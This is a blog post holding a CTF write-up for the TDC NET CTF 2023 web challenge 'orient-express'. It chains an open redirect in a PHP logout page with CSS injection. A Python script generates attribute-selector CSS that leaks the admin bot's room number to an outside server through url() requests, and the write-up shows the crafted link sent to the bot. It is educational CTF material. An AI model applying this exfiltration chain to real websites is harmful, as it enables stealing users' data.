<!DOCTYPE html>
<html lang="en"
  dir="ltr">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width">



<link rel="icon" type="image/ico" href="http://localhost:1313//favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313//favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313//favicon-32x32.png">
<link rel="icon" type="image/png" sizes="192x192" href="http://localhost:1313//android-chrome-192x192.png">
<link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313//apple-touch-icon.png">

<meta name="description" content=""/>



<title>
    
    TDC NET CTF 2023 - orient-express (&#43; revenge) | 0xlime Blog
    
</title>

<link rel="canonical" href="http://localhost:1313/posts/orient-express/"/>

<meta property="og:url" content="http://localhost:1313/posts/orient-express/">
  <meta property="og:site_name" content="0xlime Blog">
  <meta property="og:title" content="TDC NET CTF 2023 - orient-express (&#43; revenge)">
  <meta property="og:description" content="Orient express # Given description:
At first we kind of wanted the CTF to be train themed, but its really not. anyway here is another web challenge and this one is related to trains. http://your-instance-ip:10006 *---------------------------------------------------- You arrive at the orient express. There is 1 other passager, its the admin cat. You must find his cabin and steal his flag. Your booking number: **AZ921KVM** ------------------------------------------------------* (This site is known to the admin cat as http://orientexpress.local:80, make the admin cat visit a link by going to https://your-instance-ip:10004) Revenge incoming ! DOwnloading the source we can see a few things in the code.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2023-09-09T16:17:42+02:00">
    <meta property="article:modified_time" content="2023-09-09T16:17:42+02:00">













<link rel="stylesheet" href="/assets/combined.min.38f3885a8781b7bd7780021cc7bda42e40b3f6dfa0a57da2bbf7a80f944d1c5e.css" media="all">





</head>





<body class="auto">

  <div class="content">
    <header>
      

<div class="header">

    

    <h1 class="header-title">
        <a href="http://localhost:1313/">0xlime Blog</a>
    </h1>

    <div class="flex">
        

        
        
      
        <p class="small ">
            <a href="/" >
                /home
            </a>
        </p>
        
      
        <p class="small ">
            <a href="/posts" >
                /posts
            </a>
        </p>
        
      
        <p class="small ">
            <a href="https://r4.dk" >
                /about
            </a>
        </p>
        
        
    </div>

    

</div>

    </header>

    <main class="main">
      





<div class="breadcrumbs">
    
    <a href="/">Home</a>
    <span class="breadcrumbs-separator"> > </span>
    
    <a href="/posts/">Posts</a>
    <span class="breadcrumbs-separator"> > </span>
    
    <a class="breadcrumbs-current" href="/posts/orient-express/">TDC NET CTF 2023 - orient-express (&#43; revenge)</a>
</div>



<div >

  <div class="single-intro-container">

    

    <h1 class="single-title">TDC NET CTF 2023 - orient-express (&#43; revenge)</h1>
    

    

    <p class="single-readtime">
      
      
      
      <time datetime="2023-09-09T16:17:42&#43;02:00">September 9, 2023</time>
      

      
    </p>

  </div>

  

  

  

  

  <div class="single-content">
    <h1 class="heading" id="orient-express">
  Orient express
  <a class="anchor" href="#orient-express">#</a>
</h1>
<p>Given description:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>At first we kind of wanted the CTF to be train themed, but its really not.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>anyway here is another web challenge and this one is related to trains.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>http://your-instance-ip:10006
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>*----------------------------------------------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>You arrive at the orient express.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>There is 1 other passager, its the admin cat.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>You must find his cabin and steal his flag.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Your booking number: **AZ921KVM**
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>------------------------------------------------------*
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>(This site is known to the admin cat as http://orientexpress.local:80, make the admin cat visit a link by going to https://your-instance-ip:10004)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Revenge incoming !
</span></span></code></pre></div><p>DOwnloading the source we can see a few things in the code.</p>
<p><code>index.php</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;?php
</span></span><span style="display:flex;"><span>$roomnumbers = [
</span></span><span style="display:flex;"><span>    &#39;AZ921KVM&#39; =&gt; &#39;ROOM-2034&#39;,# Players room
</span></span><span style="display:flex;"><span>    &#39;XXXXXXXX&#39; =&gt; &#39;ROOM-0000&#39; # Bots room
</span></span><span style="display:flex;"><span>];
</span></span></code></pre></div><p>Here we can see that our given booking number matched &ldquo;ROOM-2034&rdquo;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;a href=&#34;/admin.php&#34; style=&#34;display: none;&#34;&gt;Admin Check &lt;/a&gt;
</span></span></code></pre></div><p>We can also see that there is an admin.php but its hidden.</p>
<p>Checking out admin php we can see that we are allowed to search for a room number every 10 minutes and if the room number exists then we get a flag.
<code>admin.php</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>` // sample dictionary
</span></span><span style="display:flex;"><span>    $roomnumbers = [
</span></span><span style="display:flex;"><span>        &#39;2034&#39; =&gt; &#39;TDCNET{S0rry_this_flag_is_f4ke_You_need_to_get_the_stupid_admin_cats_room_number}&#39;,# Players room
</span></span><span style="display:flex;"><span>        &#39;0000&#39; =&gt; &#39;TDCNET{f4k3_fl4g}&#39; # Bots room
</span></span><span style="display:flex;"><span>    ];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $valueIn = $_POST[&#39;value&#39;];
</span></span><span style="display:flex;"><span>    $value = (string) $valueIn;
</span></span><span style="display:flex;"><span>    $key =  $roomnumbers[$value];
</span></span><span style="display:flex;"><span>    if ($key !== NULL) {
</span></span><span style="display:flex;"><span>        echo &#34;&lt;br&gt;The flag for the tenant in the room &#39;&#34;.htmlspecialchars($value).&#34;&#39; is &#39;$key&#39;.&#34;;
</span></span><span style="display:flex;"><span>    } else {
</span></span><span style="display:flex;"><span>        echo &#34;&lt;br&gt;There does not seem to be any tenants in the room: &#39;&#34;.htmlspecialchars($value).&#34;&#39; &#34;;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>So we can essentially see now that we have to get the right room number for the admin / bot somehow. but in the fixed version of the challenge (revenge) there is no xss vector.</p>
<p>So lets try to log in again and see what we have.</p>
<p>











<figure class="">

    <div>
        <img loading="lazy" alt="" src="/posts/orient-express/1png.png" width="1083px" height="536px">
    </div>

    
</figure>
</p>
<p>We see we have a <code>?next=</code> parameter, often times this is a result of an open redirect. in the code: <code>logout.php</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>// handle the &#39;next&#39; GET parameter for redirection
</span></span><span style="display:flex;"><span>if (isset($_GET[&#39;next&#39;])) {
</span></span><span style="display:flex;"><span>    $next = $_GET[&#39;next&#39;];
</span></span><span style="display:flex;"><span>    header(&#34;Location: $next&#34;);
</span></span><span style="display:flex;"><span>    exit;
</span></span></code></pre></div><p>











<figure class="">

    <div>
        <img loading="lazy" alt="" src="/posts/orient-express/2png.png" width="2972px" height="931px">
    </div>

    
</figure>
</p>
<p>Ok so we have an open redirect primitive here. But that won&rsquo;t help us yet.</p>
<p>Lets read the html of the logged in page</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;!DOCTYPE html&gt;
</span></span><span style="display:flex;"><span>&lt;html&gt;
</span></span><span style="display:flex;"><span>&lt;head&gt;
</span></span><span style="display:flex;"><span>    &lt;title&gt;Train Car Room Number&lt;/title&gt;
</span></span><span style="display:flex;"><span>    &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;styles/styles.css&#34;&gt;&lt;/head&gt;
</span></span><span style="display:flex;"><span>&lt;body&gt;
</span></span><span style="display:flex;"><span>    &lt;div class=&#34;container&#34;&gt;
</span></span><span style="display:flex;"><span>        &lt;a href=&#34;/admin.php&#34; style=&#34;display: none;&#34;&gt;Admin Check &lt;/a&gt;
</span></span><span style="display:flex;"><span>        &lt;p class=&#34;success&#34;&gt;Your room number: &lt;/p&gt; &lt;a href=&#34;/image.php?room=ROOM-2034&#34; class=&#34;roomnumber&#34; &gt;ROOM-2034&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;a href=&#34;/logout.php?next=index.php&#34;&gt; logout here&lt;/a&gt;    &lt;/div&gt;
</span></span><span style="display:flex;"><span>&lt;/body&gt;
</span></span><span style="display:flex;"><span>&lt;/html&gt;
</span></span></code></pre></div><p>So we see there is a stylesheet referenced as <code>href=&quot;styles/styles.css&quot;</code></p>
<p>if we change the parameter it changes also in the code</p>
<p>











<figure class="">

    <div>
        <img loading="lazy" alt="" src="/posts/orient-express/3png.png" width="2177px" height="501px">
    </div>

    
</figure>
</p>
<p>So we can do css injection and change the stylesheet, by utilizing the open redirect like so</p>
<p><a href="https://orient-express.local:80/index.php?style=../logout.php?next=https://google.com">https://orient-express.local:80/index.php?style=../logout.php?next=https://google.com</a></p>
<p>Which we can point at our server hosting css</p>
<p>











<figure class="">

    <div>
        <img loading="lazy" alt="" src="/posts/orient-express/4png.png" width="2060px" height="1170px">
    </div>

    
</figure>
</p>
<p>But what can we use this for?</p>
<h3 class="heading" id="css-attribute-selectors-to-the-help">
  <strong>CSS ATTRIBUTE SELECTORS TO THE HELP</strong>
  <a class="anchor" href="#css-attribute-selectors-to-the-help">#</a>
</h3>
<p>So we can actually conditionally style  <code>&lt;a&gt;</code> tags in CSS based on their attributes.</p>
<p>Say you want to style an <code>&lt;a&gt;</code> tag different if its pdf or html? You can do so by:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>a[href$=&#34;.pdf&#34;] {
</span></span><span style="display:flex;"><span>  background: url(&#39;pdf-icon.png&#39;) no-repeat;
</span></span><span style="display:flex;"><span>  padding-left: 20px;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>soooo what if we want to style the <code>&lt;a&gt;</code> tag based on the room number?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>a[href=&#34;/image.php?room=ROOM-2034&#34;] {
</span></span><span style="display:flex;"><span>  color: red;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>a[href=&#34;/image.php?room=ROOM-2035&#34;] {
</span></span><span style="display:flex;"><span>  color: blue;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>a[href=&#34;/image.php?room=ROOM-2036&#34;] {
</span></span><span style="display:flex;"><span>  color: green;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We can also wildcard the start of the tag and just test the ending:</p>
<p>so just testing the end of the tag being 9997</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>a[href$=&#34;9997&#34;]{
</span></span><span style="display:flex;"><span>    color: blue;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Instead of beautiful colors we can also just reference an external resource? Like so:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>a[href$=&#34;9997&#34;]{
</span></span><span style="display:flex;"><span>    background: url(http://link:8000/aaa/log?pin=ROOM+9997});
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>a[href$=&#34;9998&#34;]{
</span></span><span style="display:flex;"><span>    background: url(http://link:8000/aaa/log?pin=ROOM+9998});
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>a[href$=&#34;9999&#34;]{
</span></span><span style="display:flex;"><span>    background: url(http://link:8000/aaa/log?pin=ROOM+9999});
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>So we just need to create a script that will take all the possible room numbers (0000-9999) and create different css stylings depending on the number, to leak the room number.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">1000</span>,<span style="color:#bd93f9">10000</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;a[href$=&#34;&#39;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">str</span>(i)<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#39;&#34;]{</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">    background: url(http://134.209.176.239:8000/aaa/log?pin=ROOM+&#39;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">str</span>(i)<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#39;});</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">}&#39;</span>)
</span></span></code></pre></div><p>which will generate the above css, lets call it <code>lol.css</code></p>
<p>so now we need to host the <code>lol.css</code> on some vps, mine is: 134.209.176.239</p>
<p>Now we craft a url and send it to the admin cat</p>
<p><code>http://orientexpress.local:80/index.php?style=../logout.php?next=http://134.209.176.239:8000/lol.css</code></p>
<p>And we get the following</p>
<p>











<figure class="">

    <div>
        <img loading="lazy" alt="" src="/posts/orient-express/5png.png" width="1910px" height="248px">
    </div>

    
</figure>
</p>
<p>and we get the room number of the stupid admin cat and can put it into the admin.php to get the flag</p>
<p>











<figure class="">

    <div>
        <img loading="lazy" alt="" src="/posts/orient-express/6png.png" width="2444px" height="1074px">
    </div>

    
</figure>
</p>
<hr>
<p>We had to make a revenge challenge because I forgot to sanitize one point in the admin page that then allowed for xss lol.</p>

    
  </div>

  


  

  
  

<div class="single-pagination">
    <hr />

    <div class="flex">

        <div class="single-pagination-prev">
            
            <div class="single-pagination-container-prev">
                <div class="single-pagination-text">←</div>
                <div class="single-pagination-text">
                    <a href="/posts/tdcnetgpt/">
                        TDC NET CTF 2023 - tdcnetgpt
                    </a>
                </div>
            </div>
            
        </div>

        <div class="single-pagination-next">
            
            <div class="single-pagination-container-next">
                <div class="single-pagination-text">
                    <a href="/posts/filesharing/">
                        TDC NET CTF 2023 - filesharing
                    </a>
                </div>
                <div class="single-pagination-text">→</div>
            </div>
            
        </div>

    </div>

    <hr />
</div>



  

  

  
  <div class="back-to-top">
    <a href="#top">
      back to top
    </a>
  </div>
  

</div>


    </main>
  </div>

  <footer>
    

    
    <p>Powered by
        <a href="https://gohugo.io/">Hugo</a>
        and
        <a href="https://github.com/tomfran/typo">tomfran/typo</a>
    </p>
    
    
    


  </footer>

  

</body>

<script>

  function isAuto() {
    return document.body.classList.contains("auto");
  }

  function setTheme() {
    if (!isAuto()) {
      return
    }

    document.body.classList.remove("auto");
    let cls = "light";
    if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
      cls = "dark";
    }

    document.body.classList.add(cls);
  }

  function invertBody() {
    document.body.classList.toggle("dark");
    document.body.classList.toggle("light");
  }

  if (isAuto()) {
    window.matchMedia('(prefers-color-scheme: dark)').addListener(invertBody);
  }

  setTheme();

</script>

<script defer src="/js/copy-code.js"></script>
</html>